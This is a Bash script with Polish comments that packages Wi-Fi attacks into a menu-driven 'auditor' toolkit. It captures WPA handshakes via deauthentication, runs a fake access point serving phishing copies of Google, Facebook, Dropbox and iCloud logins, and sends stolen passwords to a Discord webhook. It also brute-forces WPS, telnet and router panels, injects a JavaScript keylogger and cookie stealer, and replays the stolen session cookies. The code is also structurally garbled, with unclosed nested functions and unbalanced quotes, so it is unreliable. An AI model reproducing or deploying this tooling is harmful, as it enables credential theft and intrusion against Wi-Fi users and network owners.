#!/bin/bash

# hxd-shadow-toolkit - Phantom Wi-Fi Auditor by h.exe

IFACE="wlan0"
MONITOR_IFACE="${IFACE}mon"
LOGDIR="$HOME/hxd-shadow-toolkit/logs/$(date +%F_%T)"
mkdir -p "$LOGDIR"
PORTALS_DIR="$HOME/hxd-shadow-toolkit/portals"

ASCII_LOGO='  
   _________.__                 __           ________  ________   
  /   _____/|  |__   ____ _____/  |_ ___.__. \\_____  \\ \\_____  \\  
  \\_____  \\ |  |  \\_/ __ \\__  \\   __<   |  |  /  ____/  /  ____/  
  /        \\|   Y  \\  ___/ / __ \\|  |  \\___  | /       \\ /       \\ 
 /_______  /|___|  /\\___  >____  /__|  / ____| \\_______ \\\\_______ \\
         \\/      \\/     \\/     \\/      \\/              \\/       \\/
            hxd-shadow-toolkit - Phantom Wi-Fi Auditor | by h.exe'

clear
echo "$ASCII_LOGO"
sleep 2

# Funkcja zatrzymująca wszystkie procesy MITM
stop_mitm() {
    echo "[*] Zatrzymuję hostapd, dnsmasq i serwer HTTP..."
    pkill hostapd
    pkill dnsmasq
    pkill -f "python3 -m http.server"
    echo "[+] MITM zatrzymany."
}

# Funkcja wysyłająca webhook do Discorda
send_discord_webhook() {
    local message="$1"
    local webhook_url="https://discord.com/api/webhooks/TUTAJ_WKLEJ_SWÓJ_URL"

    if [[ "$webhook_url" == *"TUTAJ_WKLEJ"* ]]; then
        echo "[!] Webhook nie został ustawiony."
        return
    fi

    curl -H "Content-Type: application/json" \
         -X POST \
         -d "{\"content\":\"$message\"}" \
         "$webhook_url" > /dev/null 2>&1

    echo "[+] Webhook wysłany."
}

auto_configure_interface

auto_configure_interface() {
    echo -e "[*] Wykrywanie kompatybilnych kart sieciowych..."
    INTERFACES=$(iw dev | grep Interface | awk '{print $2}')
    if [[ -z "$INTERFACES" ]]; then
        echo "[!] Nie znaleziono żadnych interfejsów bezprzewodowych."
        exit 1
    fi
    echo -e "
Dostępne interfejsy:"
    select iface in $INTERFACES; do
        [[ -n "$iface" ]] && break
    done
    IFACE="$iface"
    MONITOR_IFACE="${IFACE}mon"
    echo "[*] Wybrano: $IFACE"
    sleep 1
}

list_targets() {
    echo -e "
[*] Trwa skanowanie sieci..."
    airmon-ng start "$IFACE" > /dev/null 2>&1
    timeout 30s airodump-ng "$MONITOR_IFACE" -w "$LOGDIR/scan" --output-format csv > /dev/null

    echo -e "
Dostępne sieci Wi-Fi:
"
    awk -F, '/^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}/ && $14 != "" {printf "%-20s  %-17s  kanał: %s
", $14, $1, $4}' "$LOGDIR/scan-01.csv" | sort | uniq

    echo -e "
Urządzenia klienckie w zasięgu (MAC -> router):
"
    awk -F, '/^[ 	]*[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}/ && $1 ~ /^[ 	]*$/ {next} /^[ 	]*$/ {next} /Station MAC/ {next} {gsub(/^ /, "", $1); gsub(/^ /, "", $6); print $1 "  ->  "$6}' "$LOGDIR/scan-01.csv" | sort | uniq

    airmon-ng stop "$MONITOR_IFACE" > /dev/null
    read -rp "
Naciśnij Enter, aby wrócić do menu..."
    fingerprint_and_vulnscan() {
    echo -e "
[*] Fingerprinting urządzeń i analiza podatności..."
    airmon-ng start "$IFACE" > /dev/null 2>&1
    timeout 30s airodump-ng "$MONITOR_IFACE" -w "$LOGDIR/fp_scan" --output-format csv > /dev/null

    echo -e "
📡 Urządzenia dostępowe (z fingerprintem):
"
    awk -F, '/^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}/ && $14 != "" {mac=$1; gsub(/ /,"",mac); vendor="Unknown";
        if (mac ~ /^00:1A:2B/) vendor="TP-Link";
        else if (mac ~ /^FC:FB:FB/) vendor="Ubiquiti";
        else if (mac ~ /^44:65:0D/) vendor="Cisco";
        else if (mac ~ /^A4:5E:60/) vendor="Huawei";
        else if (mac ~ /^60:45:BD/) vendor="Apple";
        printf "%-20s  %-17s  (%s)
", $14, $1, vendor;
    }' "$LOGDIR/fp_scan-01.csv" | sort | uniq

    echo -e "
⚠️ Możliwe podatności (na podstawie SSID / MAC):
"
    grep -E 'UPC|TL-WR|B315|ZTE|DLink|TP-LINK' "$LOGDIR/fp_scan-01.csv" | awk -F',' '{print "SSID: "$14" | MAC: "$1" --> Może być podatny (domyślne hasło / WPS / telnet)"}' | sort | uniq

    airmon-ng stop "$MONITOR_IFACE" > /dev/null
    read -rp "
Naciśnij Enter, aby wrócić do menu..."
    exploit_module() {
    echo -e "
[*] MODUŁ EXPLOITACJI (WPS / TELNET BRUTE)"
    read -rp "Podaj BSSID celu: " target_mac
    read -rp "Podaj kanał celu: " channel
    read -rp "Rodzaj ataku [wps/telnet]: " attack_type

    if [[ "$attack_type" == "wps" ]]; then
        echo -e "[*] Uruchamiam reaver..."
        airmon-ng start "$IFACE" "$channel" > /dev/null 2>&1
        reaver -i "$MONITOR_IFACE" -b "$target_mac" -vv
    elif [[ "$attack_type" == "telnet" ]]; then
        echo -e "[*] Próba brute-force telnetu (domyślne IP: 192.168.1.1)..."
        hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://192.168.1.1
    else
        echo "[!] Nieznany typ ataku."
    fi

    read -rp "
Naciśnij Enter, aby wrócić do menu..."
    http_login_brute() {
    echo -e "
[*] Atak na panel routera (HTTP login brute)"
    read -rp "Podaj adres IP panelu (np. 192.168.0.1): " router_ip
    read -rp "Podaj ścieżkę do wordlisty (np. /usr/share/wordlists/rockyou.txt): " wordlist
    read -rp "Podaj login do próby (np. admin): " login
    hydra -l "$login" -P "$wordlist" "$router_ip" http-get /
    read -rp "
Naciśnij Enter, aby wrócić do menu..."
    inject_sniffer() {
    echo -e "
[*] Wstrzykuję kod sniffera (keylogger + cookies)..."
    for portal in $(ls "$PORTALS_DIR"); do
        if grep -q "logger.php" "$PORTALS_DIR/$portal/index.html"; then
            echo -e "[*] Modyfikuję: $portal/index.html"
            sed -i '/<\/form>/i <script src="sniffer.js"></script>' "$PORTALS_DIR/$portal/index.html"
            echo 'document.addEventListener("DOMContentLoaded",()=>{
  let l=document.querySelector("input[name=login]");
  let p=document.querySelector("input[name=pass]");
  if(l&&p){
    [l,p].forEach(inp=>{
      inp.addEventListener("input",()=>{
        fetch("log.php",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({login:l.value,pass:p.value,cookies:document.cookie,agent:navigator.userAgent})})})}});' > "$PORTALS_DIR/$portal/sniffer.js"
            echo '<?php $d=json_decode(file_get_contents("php://input"),1);$f=fopen("session.log","a");fwrite($f,date("c")." | ".$d["login"].":".$d["pass"]." | ".$d["cookies"]."
");fclose($f); ?>' > "$PORTALS_DIR/$portal/log.php"
        fi
    done
    echo "[+] Sniffer wstrzyknięty do portali."
    read -rp "
Naciśnij Enter, aby wrócić do menu..."
    session_replay() {
    echo -e "
[*] Replay przechwyconej sesji (curl generator)"
    echo "[!] Wczytuję ostatni wpis z session.log..."

    last_line=$(tail -n 1 "$PORTALS_DIR"/*/session.log 2>/dev/null | tail -n 1)
    if [[ -z "$last_line" ]]; then
        echo "[!] Brak danych sesji do odtworzenia."
        read -rp "Enter, aby wrócić..."; main_menu
    fi

    cookies=$(echo "$last_line" | awk -F'\| ' '{print $3}')
    echo -e "
[+] Wygenerowany curl:
"
    echo "curl -b \"$cookies\" https://www.google.com"

    echo -e "
[!] Skopiuj powyższe polecenie i uruchom we własnej przeglądarce curl lub HTTP client."
    read -rp "
Naciśnij Enter, aby wrócić do menu..."
    main_menu
}

main_menu
}

main_menu
}

main_menu
}

main_menu
}

main_menu
} {
    echo -e "\n=== GŁÓWNE MENU ==="
    echo "1) Skanuj i przechwyć handshake"
    echo "2) MITM (Fake AP + phishing)"
    echo "3) Zainstaluj przykładowe portale phishingowe"
    echo "4) Wyjdź"
    echo "5) Zatrzymaj MITM"
    echo "6) Lista celów + fingerprinting"
    echo "7) Fingerprint + Skan podatności"
    echo "8) Moduł exploitacji (WPS/telnet bruteforce)
    echo "9) Atak na panel routera (HTTP brute login)"
    echo "10) Wstrzyknięcie kodu sniffera + sesja (JS injector)
    echo "11) Replay przechwyconej sesji (curl generator)""
    read -rp $'
Wybierz opcję [1-8]: ' opt

    case $opt in
        1) handshake_capture;;
        2) mitm_attack;;
        3) install_sample_portals; read -rp "Naciśnij Enter, aby wrócić do menu..."; main_menu;;
        4) echo "Do zobaczenia!"; exit 0;;
        5) stop_mitm; read -rp "MITM zatrzymany. Enter, by wrócić..."; main_menu;;
        6) list_targets;;
        7) fingerprint_and_vulnscan;;
        8) exploit_module;;
        9) http_login_brute;;
        10) inject_sniffer;;
        11) session_replay;;
        *) echo "Nieprawidłowy wybór."; sleep 2; main_menu;;
    esac
}

handshake_capture() {
    echo -e "\n[*] Inicjalizacja monitor mode na $IFACE..."
    airmon-ng start "$IFACE" > /dev/null 2>&1

    echo -e "\n[*] Skanowanie dostępnych sieci przez 45 sekund..."
    timeout 45s airodump-ng "$MONITOR_IFACE" -w "$LOGDIR/capture" --output-format csv > /dev/null

    TARGET=$(grep -vE "BSSID|Station" "$LOGDIR/capture-01.csv" | head -n 1 | awk -F',' '{print $1}')
    CHAN=$(grep "$TARGET" "$LOGDIR/capture-01.csv" | awk -F',' '{print $4}' | tr -d ' ')

    if [[ -z "$TARGET" ]]; then
        echo "[!] Nie znaleziono żadnej sieci."
        airmon-ng stop "$MONITOR_IFACE"
        return
    fi

    echo -e "[*] Znaleziono cel: $TARGET na kanale $CHAN"
    echo -e "[*] Rozpoczynam przechwytywanie handshake..."
    airodump-ng -c "$CHAN" --bssid "$TARGET" -w "$LOGDIR/handshake" "$MONITOR_IFACE" &
    PID=$!
    sleep 5
    echo -e "[*] Deauth do klienta..."
    aireplay-ng --deauth 10 -a "$TARGET" "$MONITOR_IFACE" > /dev/null
    sleep 20
    kill $PID
    aircrack-ng "$LOGDIR/handshake-01.cap"
    airmon-ng stop "$MONITOR_IFACE"
    echo -e "[+] Wyniki zapisane w: $LOGDIR"
    read -rp "Naciśnij Enter, aby wrócić do menu..."
    main_menu
}

install_sample_portals() {
    echo "[*] Tworzę przykładowe portale..."
    mkdir -p "$PORTALS_DIR"
    for portal in google-login facebook-login dropbox-login icloud-login; do
        mkdir -p "$PORTALS_DIR/$portal"
        echo '<form method="POST" action="logger.php"><input name="login" placeholder="Login"><input name="pass" placeholder="Hasło" type="password"><input type="submit"></form>' > "$PORTALS_DIR/$portal/index.html"
        echo '<?php $f=fopen("log.txt","a");$d=date("Y-m-d H:i:s")." | ".$_POST["login"].":".$_POST["pass"]."\n";fwrite($f,$d);fclose($f);header("Location: https://google.com");
$webhook = 'https://discord.com/api/webhooks/TUTAJ_WKLEJ_SWÓJ_URL';
if (strpos($webhook, 'TUTAJ_WKLEJ') === false) {
  $payload = json_encode(["content" => "🕵️‍♂️ Nowe dane: $d"]);
  $opts = ['http' => ["method" => "POST", "header" => "Content-Type: application/json", "content" => $payload]];
  $ctx = stream_context_create($opts);
  file_get_contents($webhook, false, $ctx);
}' > "$PORTALS_DIR/$portal/logger.php"
    done
    echo "[+] Gotowe."
}

mitm_attack() {
    echo -e "\n[*] Wybierz portal do użycia:"
    select PORTAL in $(ls "$PORTALS_DIR"); do
        [[ -n "$PORTAL" ]] && break
    done

    TMPDIR="/tmp/mitm"
    mkdir -p "$TMPDIR"
    SSID="Free_WIFI"

    echo "interface=$IFACE
ssid=$SSID
channel=6
hw_mode=g
ieee80211n=1
auth_algs=1
ignore_broadcast_ssid=0" > "$TMPDIR/hostapd.conf"
    echo "interface=$IFACE
dhcp-range=192.168.50.10,192.168.50.100,12h
dhcp-option=3,192.168.50.1
dhcp-option=6,192.168.50.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1" > "$TMPDIR/dnsmasq.conf"

    iptables --flush
    iptables -t nat --flush
    iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 53
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80

    xterm -hold -e "hostapd $TMPDIR/hostapd.conf" &
    sleep 2
    xterm -hold -e "dnsmasq -C $TMPDIR/dnsmasq.conf" &

    cd "$PORTALS_DIR/$PORTAL" || return
    python3 -m http.server 80 &

    echo -e "[*] Fake AP gotowy. Logi znajdziesz w: $PORTALS_DIR/$PORTAL/log.txt"
    read -rp "Naciśnij Enter, aby wrócić do menu..."
    main_menu
}

main_menu
